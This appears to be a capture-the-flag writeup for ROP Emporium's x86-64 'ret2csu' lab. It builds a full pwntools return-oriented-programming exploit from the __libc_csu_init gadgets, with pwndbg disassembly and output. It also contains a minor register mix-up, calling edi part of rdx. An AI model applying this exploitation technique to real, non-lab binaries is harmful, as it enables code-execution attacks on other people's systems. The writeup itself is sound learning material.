---
title: "ROP Emporium x86-64 Challenge 8: ret2csu"
date: "2025-12-29"
description: "Writeup for the ret2csu challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium x86-64 Challenge 8: ret2csu

#### December 29, 2025

We're in the home stretch! This is the last challenge of ROP Emporium. This challenge is not as unconventional as [the previous one](writeups/rop-emporium-pivot-writeup), but it will present some challenges.

The description says that this challenge is similar to the [callme](writeups/rop-emporium-callme-writeup) challenge. There's a `ret2win` function somewhere that we have to call with `0xdeadbeefdeadbeef`, `0xcafebabecafebabe` and `0xd00df00dd00df00d` as arguments. The catch is that the number of gadgets we have is very limited.

However, with this challenge we'll learn a technique that will allow us to obtain useful gadgets in virtually every ELF binary. This technique has to do with the name of this challenge: ret2csu. This vulnerability actually has a lot to do with some of the concepts of the previous challenge: dynamic linking. Let's explain what is it about.

## The issue with dynamically linked binaries

In the previous challenge we briefly talked about dynamic/shared libraries. These libraries are linked into a binary at runtime. They are quite handful because they reduce the size of binaries, because their functions aren't "copied" into the them during compile time, like static libraries do. They just get loaded into memory, allowing multiple programs to link them.

However, as is the case in many other areas of Computer Science, optimization oftentimes comes at the cost of complexity. This is the case here too. In order to make dynamic linking work, binaries need to import some extra static libraries to perform these links (this is a gross generalization, I highly recommend reading [this article](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) mentioned in the challenge description). These libraries contain some functions, obviously. And guess what? These functions contain gadgets, and pretty powerful ones!

## Our key vulnerability: `__libc_csu_init`

This function, albeit its very much unattractive name, contains **two gadgets** that grant us control of some key registers. And as I've mentioned, it can be found in lots of binaries. And of course, it's in the binary of this challenge. So let's open it up with pwndbg and begin investigating:

```
pwndbg> info functions
...
0x0000000000400640  __libc_csu_init
...
```

As you can see, I'm not lying. Let's disassemble it:

```
pwndbg> disas __libc_csu_init
   0x0000000000400640 <+0>:	    push   r15
   0x0000000000400642 <+2>:	    push   r14
   0x0000000000400644 <+4>:	    mov    r15,rdx
   0x0000000000400647 <+7>:	    push   r13
   0x0000000000400649 <+9>:	    push   r12
   0x000000000040064b <+11>:	lea    r12,[rip+0x20079e]        # 0x600df0
   0x0000000000400652 <+18>:	push   rbp
   0x0000000000400653 <+19>:	lea    rbp,[rip+0x20079e]        # 0x600df8
   0x000000000040065a <+26>:	push   rbx
   0x000000000040065b <+27>:	mov    r13d,edi
   0x000000000040065e <+30>:	mov    r14,rsi
   0x0000000000400661 <+33>:	sub    rbp,r12
   0x0000000000400664 <+36>:	sub    rsp,0x8
   0x0000000000400668 <+40>:	sar    rbp,0x3
   0x000000000040066c <+44>:	call   0x4004d0 <_init>
   0x0000000000400671 <+49>:	test   rbp,rbp
   0x0000000000400674 <+52>:	je     0x400696 <__libc_csu_init+86>
   0x0000000000400676 <+54>:	xor    ebx,ebx
   0x0000000000400678 <+56>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:	add    rbx,0x1
   0x0000000000400691 <+81>:	cmp    rbp,rbx
   0x0000000000400694 <+84>:	jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:	add    rsp,0x8
   0x000000000040069a <+90>:	pop    rbx
   0x000000000040069b <+91>:	pop    rbp
   0x000000000040069c <+92>:	pop    r12
   0x000000000040069e <+94>:	pop    r13
   0x00000000004006a0 <+96>:	pop    r14
   0x00000000004006a2 <+98>:	pop    r15
   0x00000000004006a4 <+100>:	ret
```

Pretty sizeable function. Let's focus our attention on the last instructions:

```
   0x000000000040069a <+90>:	pop    rbx
   0x000000000040069b <+91>:	pop    rbp
   0x000000000040069c <+92>:	pop    r12
   0x000000000040069e <+94>:	pop    r13
   0x00000000004006a0 <+96>:	pop    r14
   0x00000000004006a2 <+98>:	pop    r15
   0x00000000004006a4 <+100>:	ret
```

This is basically Gadget Paradise. With one gadget, we can pop values into six different registers, no questions asked.

But there's more!

```
   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
```

This might not look like a gadget at all (it doesn't end with a `ret` instruction), but it's a perfectly valid gadget. It grants us access to even more registers, thanks to the `mov` instructions. And since the `call` instruction will call an address based on `r12` and `rbx`, which are registers that we can control with the previous gadget, we can pretty much call whatever function we want. This is brutal, and it's one of the reasons why buffer overflow attacks are so dangerous. Just think about how many programs use dynamic linking! All of those binaries include this function in them.

## Hold your horses

Actually, it's not like that anymore. After the [article mentioned before](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) was published, **glibc** was updated. Essentially, they removed the necessity of statically linking `__libc_csu_init`. Now, if you dynamically compile a program and check its functions, you won't see `__libc_csu_init` anymore. Still, we can learn quite a bit by seeing how this could be exploited. That's what we'll do in this challenge.

Before that, I'd like to reflect on how this change came to be. This patch goes to show how necessary research is, and the importance of having people willing to squeeze a binary to its absolute limits with the goal of finding an exploitable vulnerability. 

The reason why this vulnerability was fixed was purely because it was found. And for that, I'd like to give some appreciation to Dr. Hector Marco-Gisbert and Dr. Ismael Ripoll-Ripoll, the two authors of the article. I find this vulnerability in particular quite cool, especially because of how portable it is (or was). Thanks two these two researchers, C programming became much more safe, so we have a lot to thank them for!

## The payload

Now that we know what tools to use, and what our goal is, we can begin building the foundations of the exploit. As we've done with the rest of the challenges, let's define some variables:

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x004004e6

CSU_POP_GADGET_ADDRESS = 0x0040069a
CSU_MOV_GADGET_ADDRESS = 0x00400680

ARG_1 = 0xdeadbeefdeadbeef
ARG_2 = 0xcafebabecafebabe
ARG_3 = 0xd00df00dd00df00d

RET2WIN_FUNCTION_ADDRESS = 0x00400510
```


Let's see what we can do with this. Before we add anything else, let's check `usefulFunction` to see how we need to call `ret2win`:

```
pwndbg> disas usefulFunction
   0x0000000000400617 <+0>:	    push   rbp
   0x0000000000400618 <+1>:	    mov    rbp,rsp
   0x000000000040061b <+4>:	    mov    edx,0x3
   0x0000000000400620 <+9>:	    mov    esi,0x2
   0x0000000000400625 <+14>:	mov    edi,0x1
   0x000000000040062a <+19>:	call   0x400510 <ret2win@plt>
   0x000000000040062f <+24>:	nop
   0x0000000000400630 <+25>:	pop    rbp
   0x0000000000400631 <+26>:	ret
```

Alright, it seems like the argument order is `(edi, esi, edx)`. This means that `ARG_1` will need to be stored in `edi`, `ARG_2` in `esi` and `ARG_3` in `edx`.

```
   0x000000000040069a <+90>:	pop    rbx
   0x000000000040069b <+91>:	pop    rbp
   0x000000000040069c <+92>:	pop    r12
   0x000000000040069e <+94>:	pop    r13
   0x00000000004006a0 <+96>:	pop    r14
   0x00000000004006a2 <+98>:	pop    r15
   0x00000000004006a4 <+100>:	ret

   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
```

Looking at the two gadgets, it seems like we can indirectly store them in those registers, by adding the arguments to `r13`, `r14` and `r15` respectively. We first pop the values into the registers with the `pop` gadget, and then we move them to the appropriate registers with the `mov` gadget. Let's write it in code:

```
payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(CSU_POP_GADGET_ADDRESS)
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(0) # r12
payload += p64(ARG_1) # r13
payload += p64(ARG_2) # r14
payload += p64(ARG_3) # r15
payload += p64(CSU_MOV_GADGET_ADDRESS)
```

This should do. Since I don't know what to write in the other registers yet, I'll pop `0`s for now.

Now that the arguments are supposedly in the correct registers, we can just call `ret2win`.

```
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
```

Because of how the `call` instruction from the `mov` gadget obtains its pointer, we'll have to perform some basic arithmetic. Just by setting `rbx` to `0`, we'll be able to jump into whatever pointer is stored in the address in `r12`. Yes, do not confuse this with a `call r12` instruction, it's a `call [r12]` instruction, meaning that it will go to the address in memory stored in `r12` and jump into whatever pointer is stored in it. This means that just popping the address of `ret2win` into `r12` won't work. We'll need to pop an address in which the address to `ret2win` is stored. Do mind the difference!

Since `ret2win` is from a shared library, its address to it will eventually be stored in the **GOT**. To get its address, we can simply execute the program, add a breakpoint anywhere (such as in `main`) and then execute the `got` command to see its address:

```
pwndbg> break main
pwndbg> run
pwndbg> got
[0x601018] pwnme -> 0x400506 (pwnme@plt+6) ◂— push 0 /* 'h' */
[0x601020] ret2win -> 0x400516 (ret2win@plt+6) ◂— push 1
```

There we have it. Now let's change the value of `RET2WIN_FUNCTION_ADDRESS` to its appropriate value...

```
RET2WIN_FUNCTION_ADDRESS = 0x601020
```

...and change the payload accordingly:

```
payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(CSU_POP_GADGET_ADDRESS)
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(RET2WIN_FUNCTION_ADDRESS) # r12
payload += p64(ARG_1) # r13
payload += p64(ARG_2) # r14
payload += p64(ARG_3) # r15
payload += p64(CSU_MOV_GADGET_ADDRESS)

open("exploit", "bw").write(payload)
```

Good! I've also added a line to write our payload into a file. Let's see what we get when we execute the binary with this input:

```
$ ./ret2csu < exploit
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> Thank you!
Incorrect parameters
```

Huh, that's weird. Let's add a breakpoint in `ret2win` to see the values of the registers when the call was made:

```
pwndbg> break ret2win
pwndbg> run < exploit
```

In the REGISTERS tab...

```
 RDX  0xd00df00dd00df00d
 RDI  0xdeadbeef
 RSI  0xcafebabecafebabe
```

It seems like the `rdi` value wasn't copied fully, only the first 4 bytes. Looking back at the `mov` gadget, it's now easy to see why:

```
   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
```

`edi` actually corresponds to **the lower 32 bits of `rdx`**. So if we move a value into it, only the first half of `rdx` will be set, the rest will be `0`s. This, is quite a pickle. 

This gadget is actually not enough for what we want to accomplish. So one valid response to that could be looking for other gadgets. Luckily, there's some light:

```
pwndbg> rop
...
0x4006a3: pop rdi ; ret
...
```

There's a gadget just for what we need. However, there's another issue. How do we jump into it?

As we know, this is the last gadget of our ROP chain:

```
   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
```

This is not like the regular-old gadget that ends with `ret`. It calls a function. This complicates what we need to do, because we can't just call a gadget like with `ret`. It has to be a valid function.

My idea was to find an "empty" function, or simulate one. After executing that function, it would return back to our function, where we'd use the next `ret` instruction to jump into the `pop rdi; ret` gadget, and then to `ret2win`. It turned out that that was a good direction to take. However, finding one is easier said that done, and I had to look it up.

Luckily for us, there is a function we can use. It's called `_fini`. It does have its uses with destructors, which are some functions executed when a program finishes its execution. However, for us, it's literally a nothing burger:

```
pwndbg> disas _fini
   0x00000000004006b4 <+0>:	sub    rsp,0x8
   0x00000000004006b8 <+4>:	add    rsp,0x8
   0x00000000004006bc <+8>:	ret
```

See? It does nothing. It's perfect for us, because once it returns, we can continue the ROP chain like nothing happened. With `info functions`, we can get the address to this function: `0x004006b4`. Since our `call` instruction in the gadget requires to use an address with the pointer to the function, we need to find where is this address stored. We can do this with the `search`command:

```
pwndbg> break main
pwndbg> run
pwndbg> search -8 0x004006b4
ret2csu         0x4003b0 mov ah, 6
ret2csu         0x400e48 mov ah, 6
ret2csu         0x6003b0 0x4006b4 (_fini)
ret2csu         0x600e48 0x4006b4 (_fini)
```

Both `0x6003b0` and `0x600e48` store the address, so we can use either. Let's create a variable in our script to store the address and replace the `call` address:

```
payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(CSU_POP_GADGET_ADDRESS)
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(_FINI_FUNCTION_ADDRESS) # r12
payload += p64(ARG_1) # r13
payload += p64(ARG_2) # r14
payload += p64(ARG_3) # r15
payload += p64(CSU_MOV_GADGET_ADDRESS)
```

However, there's something we need to keep into account. After calling `_fini`, we'll return back to `__libc_csu_init`:

```
...
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:	add    rbx,0x1  <- HERE
   0x0000000000400691 <+81>:	cmp    rbp,rbx
   0x0000000000400694 <+84>:	jne    0x400680
   0x0000000000400696 <+86>:	add    rsp,0x8
   0x000000000040069a <+90>:	pop    rbx
   0x000000000040069b <+91>:	pop    rbp
   0x000000000040069c <+92>:	pop    r12
   0x000000000040069e <+94>:	pop    r13
   0x00000000004006a0 <+96>:	pop    r14
   0x00000000004006a2 <+98>:	pop    r15
   0x00000000004006a4 <+100>:	ret
```

Until the next `ret` instruction (where we'll jump into the `pop rdi; ret` gadget and then to `ret2win`, there are 6 pop instructions. We have to take this into consideration in our payload! Because these instructions will remove values from the stack, if we put in the address to the `pop rdi; ret` gadget right after the rest of the payload, the `pop rbx` instruction will remove it, and we won't be able to jump into it once we reach `ret`. This means that we'll have to add spacing in our payload, just so the pop instructions pop empty values before the gadget and not the gadget itself. We'll need seven spacings, six for the `pop` instructions and one for the `ret` instruction in `_fini`, which also pops an entry from the stack. Let's add this in our code:

```
payload += p64(0) # ret
payload += p64(0) # pop rbx
payload += p64(0) # pop rbp
payload += p64(0) # pop r12
payload += p64(0) # pop r13
payload += p64(0) # pop r14
payload += p64(0) # pop r15
```

After this spacing, now we can add the rest of the payload:

```
payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(ARG_1)
payload += p64(RET2WIN_FUNCTION_ADDRESS)
```

This will store the argument properly.

However, this code will not work.

```
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:	add    rbx,0x1
   0x0000000000400691 <+81>:	cmp    rbp,rbx
   0x0000000000400694 <+84>:	jne    0x400680
```

Right after `call`, a comparison is made. The function will jump to a different part of the code should `rbx` and `rbp` be different. We don't want that, so we need to make sure `rbp` and `rbx` are equal after the `add` instruction. This is easy, we can just pop a `1` into `rbp` in our code.

And just one more thing! We aren't executing `ret2win` via `call` anymore. Since it had a different way of referencing functions, we'll have to change `RET2WIN_FUNCTION_ADDRESS` to its original value.

Here's the full script:

```
from pwn import *

OFFSET = 40
RET_INSTRUCTION_ADDRESS = 0x004004e6

CSU_POP_GADGET_ADDRESS = 0x0040069a
CSU_MOV_GADGET_ADDRESS = 0x00400680
POP_RDI_GADGET_ADDRESS = 0x004006a3

ARG_1 = 0xdeadbeefdeadbeef
ARG_2 = 0xcafebabecafebabe
ARG_3 = 0xd00df00dd00df00d

RET2WIN_FUNCTION_ADDRESS = 0x400510
_FINI_FUNCTION_ADDRESS = 0x6003b0

payload = b"A"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(CSU_POP_GADGET_ADDRESS)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(_FINI_FUNCTION_ADDRESS) # r12
payload += p64(ARG_1) # r13
payload += p64(ARG_2) # r14
payload += p64(ARG_3) # r15
payload += p64(CSU_MOV_GADGET_ADDRESS)
payload += p64(0) # ret
payload += p64(0) # pop rbx
payload += p64(0) # pop rbp
payload += p64(0) # pop r12
payload += p64(0) # pop r13
payload += p64(0) # pop r14
payload += p64(0) # pop r15
payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(ARG_1)
payload += p64(RET2WIN_FUNCTION_ADDRESS)


open("exploit", "bw").write(payload)
```

Executing this script and using the output file as input will give us the flag:

```
$ python3 exploit.py
$ ./ret2csu < exploit
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

